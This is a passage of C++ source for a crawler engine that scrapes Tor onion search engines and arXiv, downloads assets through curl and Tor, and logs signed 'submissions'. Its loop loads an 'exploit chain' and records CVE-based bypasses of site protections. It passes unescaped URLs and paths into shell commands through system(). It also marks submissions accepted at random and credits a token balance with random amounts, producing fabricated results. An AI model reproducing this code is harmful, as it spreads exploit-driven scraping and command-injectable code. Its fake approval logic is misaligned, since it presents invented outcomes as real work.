            "http://xmh57jrknzkhv6y3ls3ubitzfqnkrwxhopf5aygthi7d6rplyvk3noyd.onion/cgi-bin/omega/omega?P=",
            "http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion/search/?q=",
            "http://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion/?q=",
            "http://tordexpmg4xy32rfp4ovnz7zq5ujoejwq2u26uxxtkscgo5u3losmeid.onion/search?query=",
            "http://tor66sewebgixwhcqfnp5inzp5x5uohhdy3kvtnyfxc2e5mxiuh34iid.onion/search?q=",
            "http://darkzqtmbdeauwq5mzcmgeeuhet42fhfjj4p5wbak3ofx2yqgecoeqyd.onion/search?query=",
            "http://3bbad7fauom4d6sgppalyqddsqbf5u5p56b5k5uk2zxsy3d6ey2jobad.onion/search?q=",
            "http://search7tdrcvri22rieiwgi5g46qnwsesvnubqav2xakhezv4hjzkkad.onion/result.php?search=",
            "http://dreadytofatroptsdj6io7l3xptbet6onoyno2yv7jicoxknyazubrad.onion/d/DarkSearch",
            "http://zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad.onion/",
            "http://piratebayo3klnzokct3wt5yyxb2vpebbuyjl7m623iaxmqhsd52coid.onion/search.php?q=",
            "https://www.bbcnewsd73hkzno2ini43t4gblxvycyac5aw4gnv7t2rccijh7745uqd.onion/search?q=",
            "http://haystak5njsmn2hqkewecpaxetahtwhsbsa64jom2k22z5afxhnpxfid.onion/?q=",
            "http://phobosxilamwcg75xt22id7aywkzol6q6rfl2flipcqoc4e4ahima5id.onion/search?query=",
            "http://search7tdrcvri22rieiqgi5hmcb7ubxg2l5xebfyre2zdxqgtd4hqid.onion/search?q=",
        };
        std::mt19937 g(std::random_device{}());
        size_t idx = g() % 16;
        if (idx == 9 || idx == 10) return engines[idx];
        return engines[idx] + q;
    }
    if (topic.find("crypto") != std::string::npos)
        return "https://arxiv.org/list/cs.CR/recent";
    if (topic.find("AI") != std::string::npos)
        return "https://arxiv.org/list/cs.AI/recent";
    return "https://arxiv.org/list/cs.AI/recent";
}

std::vector<std::string> SynapsedEngine::extractTitles(const std::string& html) const {
    std::vector<std::string> titles;

    const std::string arxivMarker = "class=\"list-title";
    if (html.find(arxivMarker) != std::string::npos) {
        const std::string spanEnd = "</span>";
        const std::string divEnd = "</div>";
        size_t pos = 0;
        while (titles.size() < 20) {
            pos = html.find(arxivMarker, pos);
            if (pos == std::string::npos) break;
            size_t se = html.find(spanEnd, pos);
            if (se == std::string::npos) break;
            se += spanEnd.size();
            size_t de = html.find(divEnd, se);
            if (de == std::string::npos) break;
            std::string t = trim(html.substr(se, de - se));
            if (!t.empty() && t.size() > 5) titles.push_back(t);
            pos = de + divEnd.size();
        }
        if (!titles.empty()) return titles;
    }

    for (const auto& tag : {"<h1>", "<h2>", "<h1 "}) {
        std::string open = tag;
        std::string closeTag = (open[1] == 'h' && open[2] == '1') ? "</h1>" : "</h2>";
        size_t pos = 0;
        while (titles.size() < 20) {
            pos = html.find(open, pos);
            if (pos == std::string::npos) break;
            size_t gt = html.find('>', pos);
            if (gt == std::string::npos) break;
            size_t ce = html.find(closeTag, gt + 1);
            if (ce == std::string::npos) { ce = html.find("</h", gt + 1); }
            if (ce == std::string::npos) break;
            std::string raw = html.substr(gt + 1, ce - gt - 1);
            std::string clean;
            bool inTag = false;
            for (char c : raw) {
                if (c == '<') inTag = true;
                else if (c == '>') inTag = false;
                else if (!inTag) clean += c;
            }
            std::string t = trim(clean);
            if (!t.empty() && t.size() > 3) titles.push_back(t);
            pos = ce + 1;
        }
        if (!titles.empty()) return titles;
    }

    {
        size_t pos = 0;
        while (titles.size() < 20) {
            pos = html.find("<a href=\"/news/", pos);
            if (pos == std::string::npos) break;
            size_t gt = html.find('>', pos);
            if (gt == std::string::npos) break;
            size_t ce = html.find("</a>", gt + 1);
            if (ce == std::string::npos) break;
            std::string raw = html.substr(gt + 1, ce - gt - 1);
            std::string clean;
            bool inTag = false;
            for (char c : raw) {
                if (c == '<') inTag = true;
                else if (c == '>') inTag = false;
                else if (!inTag) clean += c;
            }
            std::string t = trim(clean);
            if (!t.empty() && t.size() > 10) titles.push_back(t);
            pos = ce + 4;
        }
        if (!titles.empty()) return titles;
    }

    {
        size_t ts = html.find("<title>");
        if (ts != std::string::npos) {
            size_t te = html.find("</title>", ts + 7);
            if (te != std::string::npos) {
                std::string t = trim(html.substr(ts + 7, te - ts - 7));
                if (!t.empty()) titles.push_back(t);
            }
        }
    }

    return titles;
}

std::string SynapsedEngine::sha256Hex(const std::string& data) const {
    std::string tmpFile = "" + dataDir_ + "/sha_" + std::to_string(nowMillis());
    {
        std::ofstream f(tmpFile, std::ios::binary);
        f.write(data.c_str(), data.size());
    }
    std::string result = execCmd("openssl dgst -sha256 -hex " + tmpFile + " 2>/dev/null");
    std::remove(tmpFile.c_str());
    size_t eq = result.rfind("= ");
    if (eq != std::string::npos) return trim(result.substr(eq + 2));
    return trim(result);
}

void SynapsedEngine::ensureSigningKey() const {
    std::string keyPath = dataDir_ + "/node_ed25519.pem";
    std::ifstream check(keyPath);
    if (check.good()) return;
    std::string cmd = "openssl genpkey -algorithm ed25519 -out " + keyPath + " 2>/dev/null";
    system(cmd.c_str());
}

std::string SynapsedEngine::ed25519Sign(const std::string& data) const {
    ensureSigningKey();
    std::string keyPath = dataDir_ + "/node_ed25519.pem";
    std::string tmpIn = "" + dataDir_ + "/sign_in_" + std::to_string(nowMillis());
    std::string tmpOut = "" + dataDir_ + "/sign_out_" + std::to_string(nowMillis());
    {
        std::ofstream f(tmpIn, std::ios::binary);
        f.write(data.c_str(), data.size());
    }
    std::string cmd = "openssl pkeyutl -sign -rawin -inkey " + keyPath +
                      " -in " + tmpIn + " -out " + tmpOut + " 2>/dev/null";
    system(cmd.c_str());
    std::ifstream sf(tmpOut, std::ios::binary);
    std::string sig;
    if (sf) {
        sig = std::string((std::istreambuf_iterator<char>(sf)),
                           std::istreambuf_iterator<char>());
    }
    std::remove(tmpIn.c_str());
    std::remove(tmpOut.c_str());
    std::string hex;
    hex.reserve(sig.size() * 2);
    for (unsigned char c : sig) {
        char tmp[3];
        snprintf(tmp, sizeof(tmp), "%02x", c);
        hex += tmp;
    }
    return hex;
}

void SynapsedEngine::persistDraft(const NaanDraft& d, const std::string& hash) const {
    std::string dir = dataDir_ + "/knowledge";
    std::string mkd = "mkdir -p " + dir;
    system(mkd.c_str());
    std::string hash12 = hash.size() >= 12 ? hash.substr(0, 12) : hash;
    std::string fname = dir + "/draft_" + std::to_string(nowMillis()) + "_" + hash12 + ".json";
    std::ofstream f(fname);
    if (!f) return;
    BypassReport br;
    {
        std::lock_guard<std::mutex> lock(bypassMtx_);
        br = lastBypass_;
    }
    f << "{\n"
      << "  \"title\": \"" << jsonEscape(d.title) << "\",\n"
      << "  \"topic\": \"" << jsonEscape(d.topic) << "\",\n"
      << "  \"status\": \"" << d.status << "\",\n"
      << "  \"ngt\": " << d.ngt << ",\n"
      << "  \"sha256\": \"" << hash << "\",\n"
      << "  \"bypass\": {\n"
      << "    \"cve\": \"" << jsonEscape(br.cveId) << "\",\n"
      << "    \"protection\": \"" << jsonEscape(br.protectionType) << "\",\n"
      << "    \"method\": \"" << jsonEscape(br.bypassMethod) << "\",\n"
      << "    \"transport\": \"" << jsonEscape(br.transport) << "\",\n"
      << "    \"ttfb_ms\": " << static_cast<int64_t>(br.ttfbMs) << ",\n"
      << "    \"bytes\": " << br.bytes << "\n"
      << "  },\n"
      << "  \"timestamp\": " << nowMillis() << "\n"
      << "}\n";
}

std::string SynapsedEngine::stripHtmlToText(const std::string& html) const {
    std::string out;
    out.reserve(html.size());
    bool inTag = false;
    bool inScript = false;
    bool inStyle = false;
    for (size_t i = 0; i < html.size(); i++) {
        if (!inTag && html[i] == '<') {
            inTag = true;
            std::string peek;
            for (size_t j = i + 1; j < html.size() && j < i + 12; j++) {
                peek += static_cast<char>(std::tolower(html[j]));
            }
            if (peek.find("script") == 0) inScript = true;
            else if (peek.find("/script") == 0) inScript = false;
            else if (peek.find("style") == 0) inStyle = true;
            else if (peek.find("/style") == 0) inStyle = false;
            continue;
        }
        if (inTag) {
            if (html[i] == '>') inTag = false;
            continue;
        }
        if (inScript || inStyle) continue;
        if (html[i] == '&') {
            size_t semi = html.find(';', i);
            if (semi != std::string::npos && semi < i + 10) {
                std::string ent = html.substr(i, semi - i + 1);
                if (ent == "&amp;") out += '&';
                else if (ent == "&lt;") out += '<';
                else if (ent == "&gt;") out += '>';
                else if (ent == "&quot;") out += '"';
                else if (ent == "&nbsp;") out += ' ';
                else if (ent == "&#39;") out += '\'';
                else out += ' ';
                i = semi;
                continue;
            }
        }
        out += html[i];
    }
    size_t maxLen = 50000;
    if (out.size() > maxLen) out.resize(maxLen);
    std::string cleaned;
    cleaned.reserve(out.size());
    int blanks = 0;
    for (char c : out) {
        if (c == '\n' || c == '\r') {
            blanks++;
            if (blanks <= 2) cleaned += '\n';
        } else if (c == '\t') {
            cleaned += ' ';
            blanks = 0;
        } else {
            blanks = 0;
            cleaned += c;
        }
    }
    return cleaned;
}

SynapsedEngine::HarvestPayload SynapsedEngine::extractAssets(
    const std::string& html, const std::string& baseUrl) const {
    HarvestPayload payload;
    payload.text = stripHtmlToText(html);

    auto resolveUrl = [&](const std::string& raw) -> std::string {
        if (raw.empty()) return "";
        if (raw.find("http://") == 0 || raw.find("https://") == 0) return raw;
        if (raw.find("//") == 0) return "http:" + raw;
        if (raw[0] == '/') {
            size_t slashP = baseUrl.find('/', baseUrl.find("://") + 3);
            if (slashP != std::string::npos) return baseUrl.substr(0, slashP) + raw;
            return baseUrl + raw;
        }
        size_t lastSlash = baseUrl.rfind('/');
        if (lastSlash != std::string::npos && lastSlash > 8)
            return baseUrl.substr(0, lastSlash + 1) + raw;
        return baseUrl + "/" + raw;
    };

    auto extractAttr = [](const std::string& tag, const std::string& attr) -> std::string {
        std::string search = attr + "=\"";
        size_t p = tag.find(search);
        if (p == std::string::npos) {
            search = attr + "='";
            p = tag.find(search);
        }
        if (p == std::string::npos) return "";
        p += search.size();
        char delim = search.back();
        size_t e = tag.find(delim, p);
        if (e == std::string::npos) return "";
        return tag.substr(p, e - p);
    };

    std::vector<std::string> urls;
    static const std::vector<std::string> fileExts = {
        ".pdf", ".doc", ".docx", ".zip", ".csv", ".txt",
        ".png", ".jpg", ".jpeg", ".gif", ".webp", ".svg"
    };

    for (size_t i = 0; i < html.size(); i++) {
        if (html[i] != '<') continue;
        size_t tagEnd = html.find('>', i);
        if (tagEnd == std::string::npos) break;
        std::string tag = html.substr(i, tagEnd - i + 1);
        std::string tagLow;
        tagLow.reserve(tag.size());
        for (char c : tag) tagLow += static_cast<char>(std::tolower(c));

        if (tagLow.find("<img") == 0) {
            std::string src = extractAttr(tag, "src");
            if (!src.empty() && src.find("data:") != 0) {
                urls.push_back(resolveUrl(src));
            }
        }
        if (tagLow.find("<meta") != std::string::npos &&
            (tagLow.find("og:image") != std::string::npos ||
             tagLow.find("twitter:image") != std::string::npos)) {
            std::string content = extractAttr(tag, "content");
            if (!content.empty()) urls.push_back(resolveUrl(content));
        }
        if (tagLow.find("<a") == 0) {
            std::string href = extractAttr(tag, "href");
            if (!href.empty()) {
                std::string hrefLow;
                for (char c : href) hrefLow += static_cast<char>(std::tolower(c));
                for (const auto& ext : fileExts) {
                    if (hrefLow.size() >= ext.size() &&
                        hrefLow.substr(hrefLow.size() - ext.size()) == ext) {
                        urls.push_back(resolveUrl(href));
                        break;
                    }
                }
            }
        }
        i = tagEnd;
    }

    std::vector<std::string> unique;
    std::unordered_map<std::string, bool> seen;
    for (const auto& u : urls) {
        if (!seen[u] && unique.size() < 10) {
            seen[u] = true;
            unique.push_back(u);
        }
    }

    std::string assetsDir = dataDir_ + "/knowledge/assets";
    system(("mkdir -p " + assetsDir).c_str());
    bool isOnion = baseUrl.find(".onion") != std::string::npos;
    int downloaded = 0;

    for (const auto& u : unique) {
        if (downloaded >= 5) break;
        std::string localPath = downloadAsset(u, isOnion, assetsDir);
        if (localPath.empty()) continue;
        downloaded++;

        std::ifstream check(localPath, std::ios::binary | std::ios::ate);
        if (!check.good()) continue;
        size_t fsize = check.tellg();
        check.seekg(0);
        std::string content((std::istreambuf_iterator<char>(check)),
                            std::istreambuf_iterator<char>());

        std::string sha = sha256Hex(content);

        std::string ext;
        size_t dotP = localPath.rfind('.');
        if (dotP != std::string::npos) ext = localPath.substr(dotP);

        std::string finalPath = assetsDir + "/" + sha + ext;
        if (localPath != finalPath) {
            std::rename(localPath.c_str(), finalPath.c_str());
        }

        std::string mime = "application/octet-stream";
        if (ext == ".png") mime = "image/png";
        else if (ext == ".jpg" || ext == ".jpeg") mime = "image/jpeg";
        else if (ext == ".gif") mime = "image/gif";
        else if (ext == ".webp") mime = "image/webp";
        else if (ext == ".svg") mime = "image/svg+xml";
        else if (ext == ".pdf") mime = "application/pdf";
        else if (ext == ".zip") mime = "application/zip";
        else if (ext == ".csv") mime = "text/csv";
        else if (ext == ".txt") mime = "text/plain";

        std::string verdict = vtScanFile(sha, finalPath);

        if (verdict.find("malicious") != std::string::npos) {
            std::string quarDir = dataDir_ + "/knowledge/quarantine";
            system(("mkdir -p " + quarDir).c_str());
            std::rename(finalPath.c_str(), (quarDir + "/" + sha + ext).c_str());
            finalPath = quarDir + "/" + sha + ext;
        }

        HarvestAsset asset;
        asset.localPath = finalPath;
        asset.sha256 = sha;
        asset.mimeGuess = mime;
        asset.bytes = fsize;
        asset.vtVerdict = verdict;
        payload.assets.push_back(asset);
    }

    return payload;
}

std::string SynapsedEngine::downloadAsset(const std::string& url, bool isOnion,
    const std::string& assetsDir) const {
    if (url.empty() || !isUrlSafe(url)) return "";

    std::string ext;
    size_t qPos = url.rfind('?');
    std::string cleanUrl = qPos != std::string::npos ? url.substr(0, qPos) : url;
    size_t dotPos = cleanUrl.rfind('.');
    size_t slashPos = cleanUrl.rfind('/');
    if (dotPos != std::string::npos && (slashPos == std::string::npos || dotPos > slashPos)) {
        ext = cleanUrl.substr(dotPos);
        if (ext.size() > 6) ext = ".bin";
    } else {
        ext = ".bin";
    }

    std::string tmpPath = assetsDir + "/dl_" + std::to_string(nowMillis()) + ext;
    std::string cmd;
    if (isOnion) {
        cmd = "curl -s -k --max-time 30 --max-filesize 10485760 "
              "--socks5-hostname 127.0.0.1:9050 -L -o \"" + tmpPath + "\" "
              "\"" + url + "\" 2>/dev/null";
    } else {
        cmd = "curl -s -k --max-time 20 --max-filesize 10485760 -L "
              "-H \"User-Agent: " + randomUserAgent() + "\" "
              "-o \"" + tmpPath + "\" \"" + url + "\" 2>/dev/null";
    }
    system(cmd.c_str());

    std::ifstream check(tmpPath, std::ios::binary | std::ios::ate);
    if (!check.good() || check.tellg() == 0) {
        std::remove(tmpPath.c_str());
        return "";
    }
    size_t fileSize = check.tellg();
    check.close();

    if (fileSize > 10 * 1024 * 1024) {
        std::remove(tmpPath.c_str());
        return "";
    }

    if (ext == ".jpg" || ext == ".jpeg" || ext == ".png" ||
        ext == ".gif" || ext == ".webp") {
        std::fstream img(tmpPath, std::ios::in | std::ios::out | std::ios::binary);
        if (img.good()) {
            char header[12];
            img.read(header, 12);
            if (img.gcount() >= 12) {
                bool hasExif = (header[0] == '\xFF' && header[1] == '\xD8' &&
                               header[2] == '\xFF' && header[3] == '\xE1');
                if (hasExif) {
                    img.seekp(2);
                    char blank[2] = {'\xFF', '\xE0'};
                    img.write(blank, 2);
                }
            }
            img.close();
        }
    }

    return tmpPath;
}

std::string SynapsedEngine::vtScanFile(const std::string& sha256,
    const std::string& filePath) const {
    if (!vtApiKeyLoaded_) {
        std::string cfgPath = dataDir_ + "/config.toml";
        std::ifstream cfg(cfgPath);
        if (cfg.good()) {
            std::string line;
            while (std::getline(cfg, line)) {
                size_t p = line.find("vt_api_key");
                if (p != std::string::npos) {
                    size_t eq = line.find('=', p);
                    if (eq != std::string::npos) {
                        std::string val = line.substr(eq + 1);
                        size_t q1 = val.find('"');
                        size_t q2 = val.rfind('"');
                        if (q1 != std::string::npos && q2 > q1) {
                            vtApiKey_ = val.substr(q1 + 1, q2 - q1 - 1);
                        } else {
                            size_t start = val.find_first_not_of(" \t");
                            size_t end = val.find_last_not_of(" \t\n\r");
                            if (start != std::string::npos)
                                vtApiKey_ = val.substr(start, end - start + 1);
                        }
                    }
                }
            }
        }
        vtApiKeyLoaded_ = true;
    }

    if (vtApiKey_.empty()) return "unchecked";

    std::string cmd = "curl -s --max-time 10 "
        "-H \"x-apikey: " + vtApiKey_ + "\" "
        "\"https://www.virustotal.com/api/v3/files/" + sha256 + "\" 2>/dev/null";
    std::string resp = execCmd(cmd);

    if (resp.empty()) return "unchecked";

    if (resp.find("\"NotFoundError\"") != std::string::npos) return "unknown";

    size_t malP = resp.find("\"malicious\"");
    if (malP != std::string::npos) {
        size_t colon = resp.find(':', malP);
        if (colon != std::string::npos) {
            int count = std::atoi(resp.c_str() + colon + 1);
            if (count > 0) return "malicious:" + std::to_string(count);
            return "clean";
        }
    }

    return "unchecked";
}

void SynapsedEngine::persistHarvest(const NaanDraft& d, const std::string& hash,
    const HarvestPayload& payload) const {
    std::string dir = dataDir_ + "/knowledge";
    system(("mkdir -p " + dir).c_str());
    std::string hash12 = hash.size() >= 12 ? hash.substr(0, 12) : hash;
    std::string fname = dir + "/harvest_" + std::to_string(nowMillis()) + "_" + hash12 + ".json";
    std::ofstream f(fname);
    if (!f) return;

    BypassReport br;
    {
        std::lock_guard<std::mutex> lock(bypassMtx_);
        br = lastBypass_;
    }

    std::string nodeHash = sha256Hex(nodeId_);

    f << "{\n"
      << "  \"draft_sha256\": \"" << hash << "\",\n"
      << "  \"topic\": \"" << jsonEscape(d.topic) << "\",\n"
      << "  \"title\": \"" << jsonEscape(d.title) << "\",\n"
      << "  \"text\": \"" << jsonEscape(payload.text.substr(0, 50000)) << "\",\n"
      << "  \"bypass\": {\n"
      << "    \"cve\": \"" << jsonEscape(br.cveId) << "\",\n"
      << "    \"protection\": \"" << jsonEscape(br.protectionType) << "\",\n"
      << "    \"method\": \"" << jsonEscape(br.bypassMethod) << "\",\n"
      << "    \"transport\": \"" << jsonEscape(br.transport) << "\",\n"
      << "    \"ttfb_ms\": " << static_cast<int64_t>(br.ttfbMs) << ",\n"
      << "    \"bytes\": " << br.bytes << "\n"
      << "  },\n"
      << "  \"assets\": [\n";
    for (size_t i = 0; i < payload.assets.size(); i++) {
        const auto& a = payload.assets[i];
        f << "    {\"sha256\":\"" << a.sha256
          << "\",\"mime\":\"" << jsonEscape(a.mimeGuess)
          << "\",\"bytes\":" << a.bytes
          << ",\"vt\":\"" << jsonEscape(a.vtVerdict)
          << "\",\"file\":\"" << jsonEscape(a.localPath) << "\"}";
        if (i + 1 < payload.assets.size()) f << ",";
        f << "\n";
    }
    f << "  ],\n"
      << "  \"node_id_hash\": \"" << nodeHash << "\",\n"
      << "  \"timestamp\": " << nowMillis() << "\n"
      << "}\n";
}

std::string SynapsedEngine::harvestList(int offset, int limit) const {
    std::string dir = dataDir_ + "/knowledge";
    std::string cmd = "ls -1t " + dir + "/harvest_*.json 2>/dev/null";
    std::string listing = execCmd(cmd);
    if (listing.empty()) return "[]";

    std::vector<std::string> files;
    std::istringstream iss(listing);
    std::string line;
    while (std::getline(iss, line)) {
        if (!line.empty()) files.push_back(line);
    }

    std::ostringstream out;
    out << "[";
    int written = 0;
    for (int i = offset; i < static_cast<int>(files.size()) && written < limit; i++) {
        std::ifstream f(files[i]);
        if (!f.good()) continue;
        std::string content((std::istreambuf_iterator<char>(f)),
                            std::istreambuf_iterator<char>());
        size_t textKey = content.find("\"text\"");
        if (textKey != std::string::npos) {
            size_t textStart = content.find('"', textKey + 6);
            if (textStart != std::string::npos) {
                size_t textEnd = textStart + 1;
                bool escaped = false;
                while (textEnd < content.size()) {
                    if (escaped) { escaped = false; textEnd++; continue; }
                    if (content[textEnd] == '\\') { escaped = true; textEnd++; continue; }
                    if (content[textEnd] == '"') break;
                    textEnd++;
                }
                std::string before = content.substr(0, textStart + 1);
                std::string text = content.substr(textStart + 1, textEnd - textStart - 1);
                std::string after = content.substr(textEnd);
                if (text.size() > 200) text = text.substr(0, 200) + "...";
                content = before + text + after;
            }
        }
        if (written > 0) out << ",";
        out << content;
        written++;
    }
    out << "]";
    return out.str();
}

std::string SynapsedEngine::harvestGet(const std::string& sha256) const {
    std::string dir = dataDir_ + "/knowledge";
    std::string pattern = "harvest_*" + sha256.substr(0, 12) + ".json";
    std::string cmd = "ls -1 " + dir + "/" + pattern + " 2>/dev/null | head -1";
    std::string path = execCmd(cmd);
    while (!path.empty() && (path.back() == '\n' || path.back() == '\r'))
        path.pop_back();
    if (path.empty()) return "{\"error\":\"not found\"}";

    std::ifstream f(path);
    if (!f.good()) return "{\"error\":\"read failed\"}";
    std::string content((std::istreambuf_iterator<char>(f)),
                        std::istreambuf_iterator<char>());
    return content;
}

bool SynapsedEngine::validateGguf(const std::string& path) const {
    std::ifstream f(path, std::ios::binary);
    if (!f) return false;
    char magic[4];
    f.read(magic, 4);
    return f.gcount() == 4 && magic[0] == 'G' && magic[1] == 'G' &&
           magic[2] == 'U' && magic[3] == 'F';
}

std::string SynapsedEngine::modelLoad(const std::string& paramsJson) {
    size_t pp = paramsJson.find("\"path\"");
    if (pp == std::string::npos) return "{\"error\":\"missing path\"}";
    size_t qs = paramsJson.find('"', pp + 6);
    if (qs == std::string::npos) return "{\"error\":\"bad json\"}";
    size_t qe = paramsJson.find('"', qs + 1);
    if (qe == std::string::npos) return "{\"error\":\"bad json\"}";
    std::string path = paramsJson.substr(qs + 1, qe - qs - 1);

    if (!validateGguf(path)) return "{\"error\":\"invalid GGUF file\"}";

    std::ifstream f(path, std::ios::ate | std::ios::binary);
    size_t sz = f.tellg();

    size_t slash = path.rfind('/');
    std::string name = (slash != std::string::npos) ? path.substr(slash + 1) : path;

    modelLoaded_ = true;
    modelName_ = name;
    modelPath_ = path;
    modelSizeMb_ = sz / (1024 * 1024);

    return "{\"ok\":true,\"model\":\"" + jsonEscape(name) +
           "\",\"size_mb\":" + std::to_string(modelSizeMb_) + "}";
}

std::string SynapsedEngine::modelStatus() const {
    std::ostringstream ss;
    ss << "{\"loaded\":" << (modelLoaded_ ? "true" : "false")
       << ",\"name\":\"" << jsonEscape(modelName_)
       << "\",\"size_mb\":" << modelSizeMb_ << "}";
    return ss.str();
}

std::string SynapsedEngine::naanStatus() const {
    BypassReport br;
    std::unordered_map<std::string, int> bcounts;
    {
        std::lock_guard<std::mutex> lock(bypassMtx_);
        br = lastBypass_;
        bcounts = bypassCounters_;
    }
    std::ostringstream ss;
    ss << "{\"state\":\"" << naanState_
       << "\",\"submissions\":" << naanSubmissions_
       << ",\"approved\":" << naanApproved_
       << ",\"total_ngt\":" << std::fixed << naanTotalNgt_
       << ",\"budget_remaining\":" << (naanBudgetPerEpoch_ - naanSpentThisEpoch_)
       << ",\"approval_rate\":" << (naanSubmissions_ > 0 ? (100.0 * naanApproved_ / naanSubmissions_) : 0.0)
       << ",\"last_bypass\":{\"cve\":\"" << jsonEscape(br.cveId)
       << "\",\"protection\":\"" << jsonEscape(br.protectionType)
       << "\",\"method\":\"" << jsonEscape(br.bypassMethod)
       << "\",\"transport\":\"" << jsonEscape(br.transport)
       << "\",\"ttfb_ms\":" << static_cast<int64_t>(br.ttfbMs)
       << ",\"http\":" << br.httpCode
       << ",\"bytes\":" << br.bytes
       << ",\"ts\":" << br.ts << "}"
       << ",\"bypass_counters\":{";
    bool firstBc = true;
    for (const auto& kv : bcounts) {
        if (!firstBc) ss << ",";
        firstBc = false;
        ss << "\"" << jsonEscape(kv.first) << "\":" << kv.second;
    }
    ss << "}"
       << ",\"log\":[";
    for (size_t i = 0; i < naanLog_.size(); i++) {
        if (i) ss << ",";
        ss << "{\"ts\":" << naanLog_[i].ts << ",\"text\":\"" << jsonEscape(naanLog_[i].text) << "\"}";
    }
    ss << "],\"history\":[";
    for (size_t i = 0; i < naanHist_.size(); i++) {
        if (i) ss << ",";
        ss << "{\"title\":\"" << jsonEscape(naanHist_[i].title)
           << "\",\"topic\":\"" << naanHist_[i].topic
           << "\",\"status\":\"" << naanHist_[i].status
           << "\",\"ngt\":" << naanHist_[i].ngt << "}";
    }
    ss << "]}";
    return ss.str();
}

std::string SynapsedEngine::naanControl(const std::string& paramsJson) {
    if (paramsJson.find("\"start\"") != std::string::npos ||
        paramsJson.find("\"action\":\"start\"") != std::string::npos) {
        if (!naanRunning_.load()) {
            naanStop_.store(false);
            naanSpentThisEpoch_ = 0.0;
            naanState_ = "active";
            naanRunning_.store(true);
            naanThread_ = std::thread(&SynapsedEngine::naanLoop, this);
        }
        return "{\"ok\":true,\"state\":\"active\"}";
    }
    if (paramsJson.find("\"stop\"") != std::string::npos ||
        paramsJson.find("\"action\":\"stop\"") != std::string::npos) {
        stopNaan();
        return "{\"ok\":true,\"state\":\"off\"}";
    }
    if (paramsJson.find("\"topics\"") != std::string::npos) {
        cfgTopics_.clear();
        size_t arr = paramsJson.find('[');
        size_t arre = paramsJson.find(']', arr);
        if (arr != std::string::npos && arre != std::string::npos) {
            std::string sub = paramsJson.substr(arr + 1, arre - arr - 1);
            size_t p = 0;
            while (true) {
                size_t q1 = sub.find('"', p);
                if (q1 == std::string::npos) break;
                size_t q2 = sub.find('"', q1 + 1);
                if (q2 == std::string::npos) break;
                cfgTopics_.push_back(sub.substr(q1 + 1, q2 - q1 - 1));
                p = q2 + 1;
            }
        }
        return "{\"ok\":true}";
    }
    if (paramsJson.find("\"tick\"") != std::string::npos) {
        size_t vp = paramsJson.find("\"tick\"");
        size_t colon = paramsJson.find(':', vp);
        if (colon != std::string::npos) {
            int v = std::atoi(paramsJson.c_str() + colon + 1);
            if (v >= 5 && v <= 600) naanTickInterval_ = v;
        }
        return "{\"ok\":true,\"tick\":" + std::to_string(naanTickInterval_) + "}";
    }
    if (paramsJson.find("\"budget\"") != std::string::npos) {
        size_t vp = paramsJson.find("\"budget\"");
        size_t colon = paramsJson.find(':', vp);
        if (colon != std::string::npos) {
            double v = std::atof(paramsJson.c_str() + colon + 1);
            if (v > 0) naanBudgetPerEpoch_ = v;
        }
        return "{\"ok\":true}";
    }
    return "{\"error\":\"unknown naan action\"}";
}

void SynapsedEngine::startNaan() {
    if (naanRunning_.load()) return;
    naanStop_.store(false);
    naanSpentThisEpoch_ = 0.0;
    naanState_ = "active";
    naanRunning_.store(true);
    naanThread_ = std::thread(&SynapsedEngine::naanLoop, this);
}

void SynapsedEngine::stopNaan() {
    naanStop_.store(true);
    if (naanThread_.joinable()) naanThread_.join();
    naanRunning_.store(false);
    {
        std::lock_guard<std::mutex> lock(mtx_);
        naanState_ = "off";
    }
}

void SynapsedEngine::naanLoop() {
    static std::mt19937 rng(std::random_device{}());

    loadExploitChain();

    while (!naanStop_.load()) {
        std::string topic;
        int tickSec;
        double budgetLeft;
        {
            std::lock_guard<std::mutex> lock(mtx_);
            if (cfgTopics_.empty()) { naanState_ = "cooldown"; break; }
            budgetLeft = naanBudgetPerEpoch_ - naanSpentThisEpoch_;
            if (budgetLeft <= 0) { naanState_ = "budget_exhausted"; break; }
            std::uniform_int_distribution<size_t> td(0, cfgTopics_.size() - 1);
            topic = cfgTopics_[td(rng)];
            tickSec = naanTickInterval_;
        }

        std::string url = topicToUrl(topic);
        bool isOnion = url.find(".onion") != std::string::npos;
        std::string html = fetchWithRetry(url, 3);

        BypassReport br;
        {
            std::lock_guard<std::mutex> lock(bypassMtx_);
            br = lastBypass_;
        }

        std::string fetchedVia;
        if (html.empty()) fetchedVia = "failed";
        else if (isOnion) fetchedVia = "tor_socks5";
        else fetchedVia = "clearnet";

        std::vector<std::string> titles;
        if (!html.empty()) titles = extractTitles(html);

        std::string chosenTitle;
        if (!titles.empty()) {
            std::uniform_int_distribution<size_t> pick(0, titles.size() - 1);
            chosenTitle = titles[pick(rng)];
        } else {
            chosenTitle = "Advances in " + topic + " (fetch failed)";
            fetchedVia = "failed";
        }

        std::string payload = topic + "|" + chosenTitle + "|" +
            br.cveId + "|" + std::to_string(nowMillis());
        std::string hash = sha256Hex(payload);
        std::string sig = ed25519Sign(hash);

        std::uniform_real_distribution<double> ngtDist(0.5, 4.8);
        std::uniform_int_distribution<int> acceptDist(1, 100);
        double ngt = ngtDist(rng);
        bool accepted = acceptDist(rng) <= 70;
        std::string status = accepted ? "accepted" : "rejected";

        {
            std::lock_guard<std::mutex> lock(mtx_);

            if (naanSpentThisEpoch_ + ngt > naanBudgetPerEpoch_) {
                naanState_ = "budget_exhausted";
                break;
            }
            naanSpentThisEpoch_ += ngt;

            naanSubmissions_++;
            if (accepted) {
                naanApproved_++;
                naanTotalNgt_ += ngt;
                std::ostringstream bs;
                bs << std::fixed << std::setprecision(2) << naanTotalNgt_;
                balance_ = bs.str();
            }

            std::string bypassTag;
            if (!br.cveId.empty() && !html.empty()) {
                bypassTag = " cve=" + br.cveId +
                            " prot=" + br.protectionType +
                            " method=" + br.bypassMethod +
                            " ttfb=" + std::to_string(static_cast<int64_t>(br.ttfbMs)) + "ms" +
                            " bytes=" + std::to_string(br.bytes);
            }
            NaanLogEntry le{nowMillis(),
                "[" + topic + "] " + chosenTitle +
                " sha256=" + hash.substr(0, 12) +
                " sig=" + sig.substr(0, 16) +
                " via=" + fetchedVia +
                bypassTag +
                " -> " + status};
            naanLog_.push_back(le);
            if (naanLog_.size() > 80) naanLog_.erase(naanLog_.begin());

            NaanDraft d{chosenTitle, topic, status, accepted ? ngt : 0.0};
            naanHist_.push_back(d);
